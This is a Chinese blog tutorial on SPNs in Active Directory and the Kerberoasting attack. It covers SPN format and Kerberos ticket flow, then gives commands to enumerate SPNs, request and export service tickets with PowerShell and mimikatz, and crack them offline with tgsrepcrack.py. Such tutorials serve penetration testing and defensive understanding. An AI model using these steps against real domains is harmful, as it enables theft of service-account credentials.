---
title: SPN与内网渗透
date: 2019-05-01 13:56:25
tags:
- 内网渗透
categories: 内网渗透
---

# 前言

服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。服务主体名称（SPN）是服务实例的唯一标识符。[Kerberos身份验证](https://docs.microsoft.com/zh-cn/windows/desktop/ad/mutual-authentication-using-kerberos)使用SPN将服务实例与服务登录帐户相关联。这允许客户端应用程序请求服务验证帐户，即使客户端没有帐户名。

根据微软的解释：可以创建两种类型的SPN：一种是基于主机的，另一种是任意的。在Active Directory中创建新计算机帐户时，将自动为内置服务生成基于主机的SPN。这些服务的示例包括HOST，LDAP和HTTP。实际上，SPN仅为HOST服务创建，所有内置服务都使用HOST SPN。但是，此实现是透明的，因为内置名称充当HOST服务的别名，除非它们已专门映射到Windows帐户。

<!--more-->

# SPN的意义及在redteam中的使用

## SPN的格式

```
serviceclass/host:port/servicename
```

说明：

**·** serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等。

**·** host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01。

**·** 如果服务运行在默认端口上，则端口号(port)可以省略。

eg：

```
TEST/pc-name.mydomain.com
MSSQLSvc/DC1.test.com
exchangeMDB/adsmsEXCAS01.adsecurity.org
```



## Kerberoast

### Kerberos协议认证

KDC包含AS、TGS

![](E:/images/Visio-KerberosComms.png)

简单来说，clinet要访问server或者服务，需要client向AS请求ticket，然后使用ticket请求TGS，KDC将分发响应的session_key给client和与之建立联系的server

对于4.tgs_reply，用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为`RC4-HMAC`

站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生成TGS进行比较。如果TGS相同，代表口令正确，就能获得目标服务实例的明文口令

### SPN 在身份验证过程中所起的作用

[以SQLSERVER为例子](<https://docs.microsoft.com/zh-cn/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-2017>)

当应用程序打开一个连接并使用 Windows 身份验证时， SQL Server Native Client 会传递 SQL Server 计算机名、实例名和 SPN（可选）。 如果该连接传递了 SPN，则使用它时不对它做任何更改。

如果该连接未传递 SPN，则将根据所使用的协议、服务器名和实例名构造一个默认的 SPN。

在上面这两种情况下，都会将 SPN 发送到密钥分发中心以获取用于对连接进行身份验证的安全标记。 如果无法获取安全标记，则身份验证采用 NTLM。

服务主体名称 (SPN) 是客户端用来唯一标识服务实例的名称。 Kerberos 身份验证服务可以使用 SPN 对服务进行身份验证。 当客户端想要连接到某个服务时，它将查找该服务的实例，并为该实例编写 SPN，然后连接到该服务并显示该服务的 SPN 以进行身份验证。

Windows 身份验证是向 SQL Server 验证用户身份的首选方法。 使用 Windows 身份验证的客户端通过 NTLM 或 Kerberos 进行身份验证。 在 Active Directory 环境中，始终首先尝试 Kerberos 身份验证。 Kerberos 身份验证不可用于使用命名管道的 SQL Server 2005 客户端。

### 域内的主机都能查询SPN

使用脚本查询SPN

SETSPN

```powershell
setspn -T pentestlab -Q */*
```

![](/images/setspn-service-discovery.png)

GetUserSPNs

```
powershell_import /root/Desktop/GetUserSPNs.ps1
```

![](/images/getuserspns-powershell-script.png)

```
cscript.exe GetUserSPNs.vbs
```

![](/images/getuserspns-vbs-script-cmd.png)

### 域内的任何用户都可以向域内的任何服务请求TGS

1. 请求TGS

   ```
   $SPNName = 'MSSQLSvc/DC1.test.com'
   Add-Type -AssemblyNAme System.IdentityModel
   New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
   ```

2. 导出TGS

   ```
   kerberos::list /export
   ```

3. 暴力破解

   <https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py>

   ```
   ./tgsrepcrack.py wordlist.txt test.kirbi
   ```

   另一种利用方式参考：https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/

# 总结

1.在 Active Directory 环境中，始终首先尝试 Kerberos 身份验证。如果使用IP或无法找寻SPN，将走NTLM协议。

2.SPN扫描发现资产，收集信息，快速定位存在可能脆弱的服务

3.破解TGS TICKETS

4.发现SPN是通过LDAP查询的

# 参考资料

<https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/>

<http://www.cnblogs.com/backlion/p/8082623.html>

<https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/>

<https://pentestlab.blog/2018/06/04/spn-discovery/>

<https://pentestlab.blog/2018/06/12/kerberoast/>

<https://docs.microsoft.com/zh-cn/sql/reporting-services/report-server/register-a-service-principal-name-spn-for-a-report-server?view=sql-server-2017>

<https://docs.microsoft.com/zh-cn/windows/desktop/ad/service-principal-names>

<https://adsecurity.org/?p=3458>

